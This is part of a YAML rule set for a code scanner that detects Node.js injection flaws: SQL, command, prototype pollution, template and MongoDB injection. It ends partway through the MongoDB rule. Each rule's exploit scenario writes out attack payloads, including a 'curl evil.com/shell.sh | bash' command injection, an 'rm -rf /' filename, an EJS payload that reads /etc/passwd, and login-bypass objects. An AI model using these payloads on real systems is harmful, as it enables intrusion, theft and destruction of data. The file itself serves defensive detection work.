  # ==========================================================================
  # JS-INJ-006: Template Literal SQL Injection (Node.js)
  # ==========================================================================
  - rule_id: JS-INJ-006
    title: Template Literal SQL Injection in Node.js
    description: >
      Detects SQL queries constructed using template literals or string
      concatenation with user-controlled input in Node.js applications.
      This enables SQL injection attacks against backend databases.
    language: javascript
    category: injection
    severity: Critical
    confidence: 0.93
    cwe: CWE-89
    owasp: "A03:2021-Injection"
    tags: [sql-injection, template-literal, nodejs, database]
    detection_layer: 2
    attack_surface_type: "api"
    patterns:
      - type: regex
        pattern: '(?:query|execute|raw)\s*\(\s*`[^`]*(?:SELECT|INSERT|UPDATE|DELETE|DROP)\b[^`]*\$\{[^}]*(?:req|request|params|query|body|input|user)[^}]*\}'
        description: "SQL query with template literal containing user input"
      - type: regex
        pattern: '(?:query|execute|raw)\s*\(\s*[\x27"][^)]*(?:SELECT|INSERT|UPDATE|DELETE)\b[^)]*[\x27"]\s*\+\s*(?:req|request|params|query|body|input|user)'
        description: "SQL query with string concatenation of user input"
      - type: regex
        pattern: '(?:db|connection|pool|client|knex|sequelize|prisma)\s*\.(?:query|raw|execute)\s*\(\s*`[^`]*\$\{'
        description: "Database client query with interpolated variables"
      - type: regex
        pattern: '`\s*(?:SELECT|INSERT|UPDATE|DELETE)\b[^`]*WHERE\b[^`]*\$\{[^}]*(?:req|params|body|query)\.'
        description: "SQL WHERE clause with template literal user input"
      - type: regex
        pattern: '(?:sequelize|knex|typeorm)\s*\.(?:query|raw)\s*\(\s*[\x27"`].*\+\s*\w+'
        description: "ORM raw query with string concatenation"
    anti_patterns:
      - '\.query\s*\(\s*[\x27"][^${}]+[\x27"]\s*,\s*\['
      - 'parameterized'
      - 'prepared\s*statement'
      - '\.query\s*\(\s*[\x27"][^${}]*\?\s*[\x27"]\s*,'
      - 'knex\s*\(\s*[\x27"]\w+[\x27"]\s*\)\s*\.where'
      - 'sequelize\s*\.escape'
      - 'sanitize'
      - 'test\s*\('
    bypass_variants:
      - description: "Second-order SQL injection via stored data"
        pattern: '(?:query|execute)\s*\(\s*`[^`]*\$\{.*(?:stored|cached|saved|db)\.'
      - description: "SQL injection via ORDER BY"
        pattern: '`[^`]*ORDER\s+BY\s+\$\{'
    evasion_indicators:
      - "Template literal injection in SQL"
      - "String concatenation in ORM raw queries"
      - "ORDER BY/GROUP BY injection"
    encoding_variants:
      - type: "unicode_escape"
        pattern: '\\u0027|\\u0022'
      - type: "hex_escape"
        pattern: '\\x27|\\x22'
    multi_function_chain_patterns:
      - "req.query.id -> template literal -> db.query(sql)"
      - "req.body.search -> string concat -> connection.execute"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "SQL injection enables data theft, modification, and potential RCE via DB features"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "req.query.id, req.body.search"
        sink: "db.query(sql)"
        through: "template literal or string concatenation"
    impact: |
      SQL injection allows attackers to read, modify, or delete database
      records, bypass authentication, and potentially execute OS commands
      via database-specific features.
    remediation: |
      - Use parameterized queries: db.query('SELECT * WHERE id = ?', [id]).
      - Use ORM query builders (Knex, Sequelize, TypeORM) instead of raw SQL.
      - Validate and sanitize all user input used in queries.
    references:
      - "https://cwe.mitre.org/data/definitions/89.html"
      - "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
    context_awareness:
      surrounding_context_patterns: ['require\s*\(\s*[\x27"](?:mysql|pg|sqlite|mssql)', 'knex', 'sequelize']
      taint_source_indicators: ['req\.body', 'req\.query', 'req\.params']
      taint_sink_indicators: ['\.query\s*\(', '\.execute\s*\(', '\.raw\s*\(']
      sanitization_patterns: ['parameterized', '\.escape\s*\(', 'prepared']
    severity_scoring:
      severity_weight: 10
      risk_score_formula_hint: "severity_weight * confidence * (1 - sanitization_factor)"
      exploitability_score: "High"
    exploit_scenario:
      attack_example: |
        A Node.js API uses db.query(`SELECT * FROM users WHERE id = ${req.params.id}`).
        Attacker sends id=1 UNION SELECT password FROM admin_users-- to dump admin passwords.
      example_payload: "1 UNION SELECT username, password FROM users--"
      attacker_objective: "Extract sensitive data from the database via SQL injection"
    confidence_factors:
      pattern_strength: "high"
      context_match: "high"
      proximity_to_user_input: "high"
      sanitization_absence: "high"
    metadata:
      rule_version: "3.0.0"
      last_reviewed: "2025-01-15"
      rule_maturity_level: "hardened"
      detection_complexity: "contextual"
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: false
      high_impact_flag: true
      related_rules: [JS-INJ-010, JS-INJ-015]

  # ==========================================================================
  # JS-INJ-007: child_process.exec Command Injection
  # ==========================================================================
  - rule_id: JS-INJ-007
    title: child_process.exec Command Injection
    description: >
      Detects command injection via Node.js child_process.exec, execSync, or
      spawn with shell:true where user-controlled input is passed as part of
      the command string. exec() passes the command through a shell interpreter,
      enabling injection of shell metacharacters for arbitrary command execution.
    language: javascript
    category: injection
    severity: Critical
    confidence: 0.96
    cwe: CWE-78
    owasp: "A03:2021-Injection"
    tags: [command-injection, child-process, rce, nodejs, os-command]
    detection_layer: 1
    attack_surface_type: "api"
    patterns:
      - type: regex
        pattern: '(?:exec|execSync)\s*\(\s*[`][^`]*\$\{[^}]*(?:req|request|params|query|body|input|user|filename|path|cmd)[^}]*\}'
        description: "exec with template literal containing user input"
      - type: regex
        pattern: '(?:exec|execSync)\s*\(\s*[\x27"][^)]*[\x27"]\s*\+\s*(?:req|request|params|query|body|input|user|filename|path)'
        description: "exec with string concatenation of user input"
      - type: regex
        pattern: 'child_process\s*\.\s*(?:exec|execSync|execFile)\s*\(\s*(?:req|request|params|query|body|input|user|cmd|command)'
        description: "child_process.exec with user-controlled command"
      - type: regex
        pattern: 'spawn\s*\(\s*[\x27"][^)]*[\x27"]\s*,\s*\[[^\]]*(?:req|input|user|data)\.'
        description: "spawn with user-controlled arguments"
      - type: regex
        pattern: 'spawn\s*\(\s*[^,]+,\s*[^,]+,\s*\{[^}]*shell\s*:\s*true'
        description: "spawn with shell:true option"
    anti_patterns:
      - 'exec\s*\(\s*[\x27"][^${}]+[\x27"]\s*[,\)]'
      - 'execFile\s*\('
      - 'spawn\s*\(\s*[\x27"][^)]*[\x27"]\s*,\s*\[[^\]]*[\x27"][^${}]*[\x27"]'
      - 'shell\s*:\s*false'
      - 'sanitize'
      - 'escapeshellarg'
      - 'shellescape'
      - 'test\s*\('
    bypass_variants:
      - description: "Command injection via semicolon"
        pattern: ';[^;]*(?:cat|ls|wget|curl|nc|bash)\s+'
      - description: "Injection via backtick substitution"
        pattern: '`[^`]*(?:cat|ls|wget|curl|nc|bash)'
      - description: "Pipe injection"
        pattern: '\|[^|]*(?:sh|bash|python|perl|ruby)'
    evasion_indicators:
      - "Shell metacharacter injection (; | & ` $())"
      - "Encoded shell commands"
      - "Newline injection in command"
    encoding_variants:
      - type: "hex_encoded_commands"
        pattern: '\\x[0-9a-fA-F]{2}'
      - type: "base64_encoded"
        pattern: 'echo\s+[A-Za-z0-9+/=]+\s*\|\s*base64\s+-d'
    multi_function_chain_patterns:
      - "req.query.filename -> exec('convert ' + filename)"
      - "req.body.host -> execSync('ping ' + host)"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "Arbitrary OS command execution with Node.js process privileges"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "req.body.host, req.query.filename"
        sink: "exec(), execSync()"
        through: "string concatenation or template literal"
    impact: |
      Arbitrary OS command execution enabling full server compromise, data
      exfiltration, lateral movement, ransomware deployment, and persistent
      backdoor installation.
    remediation: |
      - Use execFile() or spawn() without shell:true for safe execution.
      - Pass arguments as arrays, never as concatenated strings.
      - Validate input against strict allowlists.
      - Use shell-escape or shell-quote library for unavoidable shell usage.
    references:
      - "https://cwe.mitre.org/data/definitions/78.html"
      - "https://nodejs.org/api/child_process.html"
    context_awareness:
      surrounding_context_patterns: ['require\s*\(\s*[\x27"]child_process[\x27"]\s*\)', 'import.*child_process']
      taint_source_indicators: ['req\.body', 'req\.query', 'req\.params', 'process\.argv']
      taint_sink_indicators: ['exec\s*\(', 'execSync\s*\(', 'spawn\s*\(']
      sanitization_patterns: ['execFile', 'shell-escape', 'shell-quote', 'allowlist']
    severity_scoring:
      severity_weight: 10
      risk_score_formula_hint: "severity_weight * confidence * (1 - sanitization_factor)"
      exploitability_score: "High"
    exploit_scenario:
      attack_example: |
        An image processing API runs exec('convert ' + req.body.filename + ' output.png').
        Attacker sends filename="; rm -rf / #" to execute destructive commands.
      example_payload: "test.png; curl https://evil.com/shell.sh | bash"
      attacker_objective: "Execute arbitrary OS commands via command injection"
    confidence_factors:
      pattern_strength: "high"
      context_match: "high"
      proximity_to_user_input: "high"
      sanitization_absence: "high"
    metadata:
      rule_version: "3.0.0"
      last_reviewed: "2025-01-15"
      rule_maturity_level: "hardened"
      detection_complexity: "contextual"
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: true
      high_impact_flag: true
      related_rules: [JS-INJ-002, JS-INJ-006]

  # ==========================================================================
  # JS-INJ-008: Prototype Pollution via Merge/Extend
  # ==========================================================================
  - rule_id: JS-INJ-008
    title: Prototype Pollution via Object Merge/Extend
    description: >
      Detects prototype pollution vulnerabilities where user-controlled objects
      are merged into application objects using recursive merge, deep extend, or
      Object.assign patterns. Attackers can inject __proto__, constructor, or
      prototype properties to modify Object.prototype, affecting all objects.
    language: javascript
    category: injection
    severity: High
    confidence: 0.88
    cwe: CWE-1321
    owasp: "A03:2021-Injection"
    tags: [prototype-pollution, merge, extend, javascript, object-injection]
    detection_layer: 3
    attack_surface_type: "api"
    patterns:
      - type: regex
        pattern: '(?:merge|extend|assign|defaults|deepMerge|deepExtend)\s*\([^)]*(?:req\.|request\.|body|query|params|input|user|data)\.'
        description: "Deep merge with user-controlled object"
      - type: regex
        pattern: 'Object\.assign\s*\(\s*(?:\{\}|target|defaults|config)\s*,\s*(?:req\.|request\.|body|query|params|input|user)'
        description: "Object.assign with user-controlled source"
      - type: regex
        pattern: '(?:lodash|_)\s*\.(?:merge|mergeWith|defaultsDeep|assign)\s*\([^)]*(?:req|request|body|query|params|input|user)'
        description: "Lodash merge with user-controlled input"
      - type: regex
        pattern: '(?:hoek|qs|deep-extend|merge-deep|deepmerge)\s*\.(?:merge|applyToDefaults)\s*\([^)]*(?:req|input|user)'
        description: "Third-party deep merge with user input"
    anti_patterns:
      - 'Object\.freeze\s*\('
      - 'Object\.create\s*\(\s*null\s*\)'
      - '__proto__.*delete'
      - 'hasOwnProperty'
      - 'sanitize'
      - 'Object\.keys\s*\('
      - 'JSON\.parse\s*\(\s*JSON\.stringify'
    bypass_variants:
      - description: "Pollution via __proto__ key"
        pattern: '__proto__'
      - description: "Pollution via constructor.prototype"
        pattern: 'constructor\.prototype'
    evasion_indicators:
      - "__proto__ key in user JSON"
      - "constructor.prototype chain"
      - "Nested object with prototype keys"
    encoding_variants:
      - type: "unicode_escape"
        pattern: '\\u005f\\u005fproto\\u005f\\u005f'
      - type: "mixed_case"
        pattern: '__Proto__'
    multi_function_chain_patterns:
      - "req.body (JSON with __proto__) -> _.merge(defaults, body)"
      - "req.query -> qs.parse -> Object.assign(config, parsed)"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "Prototype pollution can lead to RCE, authentication bypass, and DoS"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "req.body (JSON)"
        sink: "_.merge(), Object.assign()"
        through: "__proto__ key in parsed JSON"
    impact: |
      Prototype pollution can modify behavior of all JavaScript objects,
      enabling RCE (via gadget chains), authentication bypass, XSS, and DoS.
    remediation: |
      - Use Object.create(null) for dictionary objects.
      - Freeze prototypes with Object.freeze(Object.prototype).
      - Use Map instead of plain objects for user-controlled keys.
      - Validate and strip __proto__, constructor, prototype keys from input.
    references:
      - "https://cwe.mitre.org/data/definitions/1321.html"
      - "https://portswigger.net/web-security/prototype-pollution"
    context_awareness:
      surrounding_context_patterns: ['require\s*\(\s*[\x27"]lodash[\x27"]\s*\)', 'Object\.assign']
      taint_source_indicators: ['req\.body', 'req\.query', 'JSON\.parse']
      taint_sink_indicators: ['\.merge\s*\(', '\.extend\s*\(', 'Object\.assign']
      sanitization_patterns: ['Object\.freeze', 'hasOwnProperty', '__proto__.*filter']
    severity_scoring:
      severity_weight: 8
      risk_score_formula_hint: "severity_weight * confidence * gadget_availability"
      exploitability_score: "High"
    exploit_scenario:
      attack_example: |
        An Express app merges user settings with defaults via _.merge(defaults, req.body).
        Attacker sends {"__proto__":{"isAdmin":true}} to pollute all objects with isAdmin=true.
      example_payload: '{"__proto__":{"isAdmin":true,"role":"admin"}}'
      attacker_objective: "Modify Object.prototype to bypass security checks"
    confidence_factors:
      pattern_strength: "high"
      context_match: "high"
      proximity_to_user_input: "high"
      sanitization_absence: "high"
    metadata:
      rule_version: "3.0.0"
      last_reviewed: "2025-01-15"
      rule_maturity_level: "hardened"
      detection_complexity: "contextual"
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: true
      high_impact_flag: true
      related_rules: [JS-INJ-002, JS-INJ-014]

  # ==========================================================================
  # JS-INJ-009: Server-Side Template Injection (EJS/Pug/Handlebars)
  # ==========================================================================
  - rule_id: JS-INJ-009
    title: Server-Side Template Injection (SSTI)
    description: >
      Detects SSTI vulnerabilities in Node.js template engines (EJS, Pug,
      Handlebars, Nunjucks) where user-controlled input is used as template
      content rather than template data, enabling arbitrary code execution.
    language: javascript
    category: injection
    severity: High
    confidence: 0.91
    cwe: CWE-94
    owasp: "A03:2021-Injection"
    tags: [ssti, template-injection, ejs, pug, handlebars, rce]
    detection_layer: 2
    attack_surface_type: "web"
    patterns:
      - type: regex
        pattern: 'ejs\.render\s*\(\s*(?:req\.|request\.|body|query|params|input|user|template|content)'
        description: "EJS render with user-controlled template"
      - type: regex
        pattern: 'pug\.render\s*\(\s*(?:req\.|request\.|body|query|params|input|user|template|content)'
        description: "Pug render with user-controlled template"
      - type: regex
        pattern: 'Handlebars\.compile\s*\(\s*(?:req\.|request\.|body|query|params|input|user|template|content)'
        description: "Handlebars compile with user-controlled template"
      - type: regex
        pattern: 'nunjucks\.renderString\s*\(\s*(?:req\.|request\.|body|query|params|input|user|template|content)'
        description: "Nunjucks renderString with user-controlled template"
      - type: regex
        pattern: '\.render\s*\(\s*(?:req\.body|req\.query)\s*\.\s*(?:template|content|html|markup)\b'
        description: "Generic template render with user template field"
    anti_patterns:
      - '\.render\s*\(\s*[\x27"][^${}]+[\x27"]\s*,'
      - 'res\.render\s*\(\s*[\x27"]'
      - 'sanitize'
      - 'test\s*\('
      - 'template\s*=\s*[\x27"][^${}]+[\x27"]'
      - '\.renderFile\s*\('
    bypass_variants:
      - description: "EJS include directive injection"
        pattern: '<%\s*include\s+.*%>'
      - description: "EJS code block injection"
        pattern: '<%[-=]?\s*.*require\s*\('
    evasion_indicators:
      - "Template syntax injection (<%= %>, {{ }}, #{ })"
      - "Template directive injection"
    encoding_variants:
      - type: "html_entities"
        pattern: '&lt;%.*%&gt;'
      - type: "url_encoding"
        pattern: '%3C%25.*%25%3E'
    multi_function_chain_patterns:
      - "req.body.template -> ejs.render(template, data)"
      - "req.query.content -> nunjucks.renderString(content)"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "SSTI enables RCE via template engine code execution"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "req.body.template"
        sink: "ejs.render()"
        through: "user-controlled template string"
    impact: |
      SSTI in Node.js template engines enables arbitrary code execution on the
      server, leading to full system compromise, data exfiltration, and RCE.
    remediation: |
      - Never use user input as template content; only pass it as template data.
      - Use res.render(viewName, {data}) with predefined template files.
      - Enable sandboxed template execution where available.
      - Use logic-less templates (Mustache) that don't support code execution.
    references:
      - "https://cwe.mitre.org/data/definitions/94.html"
      - "https://portswigger.net/web-security/server-side-template-injection"
    context_awareness:
      surrounding_context_patterns: ['require\s*\(\s*[\x27"]ejs[\x27"]\s*\)', 'require\s*\(\s*[\x27"]pug[\x27"]\s*\)']
      taint_source_indicators: ['req\.body\.template', 'req\.query\.content']
      taint_sink_indicators: ['\.render\s*\(', '\.compile\s*\(', '\.renderString\s*\(']
      sanitization_patterns: ['res\.render\s*\(\s*[\x27"]', 'renderFile']
    severity_scoring:
      severity_weight: 10
      risk_score_formula_hint: "severity_weight * confidence * (1 - sanitization_factor)"
      exploitability_score: "High"
    exploit_scenario:
      attack_example: |
        A CMS allows custom email templates. The app uses ejs.render(req.body.template, data).
        Attacker sends template=<%= process.mainModule.require('child_process').execSync('id') %>.
      example_payload: "<%= global.process.mainModule.require('child_process').execSync('cat /etc/passwd') %>"
      attacker_objective: "Achieve RCE through server-side template injection"
    confidence_factors:
      pattern_strength: "high"
      context_match: "high"
      proximity_to_user_input: "high"
      sanitization_absence: "high"
    metadata:
      rule_version: "3.0.0"
      last_reviewed: "2025-01-15"
      rule_maturity_level: "hardened"
      detection_complexity: "contextual"
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: true
      high_impact_flag: true
      related_rules: [JS-INJ-002, JS-INJ-007]

  # ==========================================================================
  # JS-INJ-010: MongoDB NoSQL Injection
  # ==========================================================================
  - rule_id: JS-INJ-010
    title: MongoDB NoSQL Injection
    description: >
      Detects NoSQL injection in MongoDB queries where user-controlled input
      is passed directly to MongoDB operators like $where, $regex, $gt, $ne,
      enabling query manipulation, authentication bypass, and data exfiltration.
    language: javascript
    category: injection
    severity: High
    confidence: 0.90
    cwe: CWE-943
    owasp: "A03:2021-Injection"
    tags: [nosql-injection, mongodb, query-injection, authentication-bypass]
    detection_layer: 2
    attack_surface_type: "api"
    patterns:
      - type: regex
        pattern: '\.find\s*\(\s*\{[^}]*(?:req\.|request\.|body|query|params|input|user)\.'
        description: "MongoDB find with user-controlled query object"
      - type: regex
        pattern: '\.find(?:One)?\s*\(\s*(?:req\.|request\.)(?:body|query|params)'
        description: "MongoDB find with entire request body as query"
      - type: regex
        pattern: '\$where\s*:\s*(?:req\.|request\.|body|query|params|input|user|function)'
        description: "MongoDB $where with user-controlled JavaScript"
      - type: regex
        pattern: '\$(?:regex|gt|gte|lt|lte|ne|in|nin|or|and)\s*:\s*(?:req\.|request\.|body|query|params|input|user)\.'
        description: "MongoDB operator with user-controlled value"
      - type: regex
        pattern: '\.(?:findOne|updateOne|deleteOne|aggregate)\s*\(\s*(?:req\.|request\.)(?:body|query)\b'
        description: "MongoDB operation with direct request body"
    anti_patterns:
      - 'mongoose\.Schema'
      - '\.sanitize\s*\('
      - 'mongo-sanitize'
      - 'express-mongo-sanitize'
      - '\.validate\s*\('
      - 'Joi\.'
      - 'test\s*\('
      - 'ObjectId\s*\('
    bypass_variants:
      - description: "Operator injection via JSON body"
        pattern: '\\$(?:gt|ne|regex)\s*:'
      - description: "$where JavaScript injection"
        pattern: '\\$where\s*:\s*[\x27"].*(?:sleep|this\.)'
    evasion_indicators:
      - "MongoDB operator injection in JSON body"
      - "$where JavaScript code execution"
      - "$regex with ReDoS patterns"
    encoding_variants:
      - type: "unicode"
        pattern: '\\u0024where'
      - type: "url_encoding"
        pattern: '%24where'
    multi_function_chain_patterns:
      - "req.body -> db.collection.find(req.body)"
      - "req.query -> { username: req.query.user, password: req.query.pass }"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "NoSQL injection enables authentication bypass and data exfiltration"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "req.body"
        sink: "db.collection.find()"
        through: "direct body pass as query object"
    impact: |
      NoSQL injection allows attackers to bypass authentication, extract data,
      modify queries, and potentially execute server-side JavaScript via $where.
    remediation: |
      - Use express-mongo-sanitize middleware.
      - Validate input types strictly (expect string, reject objects).
      - Never pass raw request body/query to MongoDB operations.
      - Use MongoDB parameterized queries and avoid $where.
    references:
      - "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection"
    context_awareness:
      surrounding_context_patterns: ['require\s*\(\s*[\x27"]mongodb[\x27"]\s*\)', 'mongoose\.']
      taint_source_indicators: ['req\.body', 'req\.query', 'req\.params']
      taint_sink_indicators: ['\.find\s*\(', '\.findOne\s*\(', '\.aggregate\s*\(', '\\$where']
      sanitization_patterns: ['mongo-sanitize', 'ObjectId\s*\(', 'Joi\.', 'validate']
    severity_scoring:
      severity_weight: 8
      risk_score_formula_hint: "severity_weight * confidence * (1 - sanitization_factor)"
      exploitability_score: "High"
    exploit_scenario:
      attack_example: |
        A login endpoint uses db.users.findOne({username: req.body.username, password: req.body.password}).
        Attacker sends {"username":"admin","password":{"$ne":""}} to bypass authentication.
      example_payload: '{"username":"admin","password":{"$gt":""}}'
      attacker_objective: "Bypass authentication or extract data via MongoDB operator injection"
    confidence_factors:
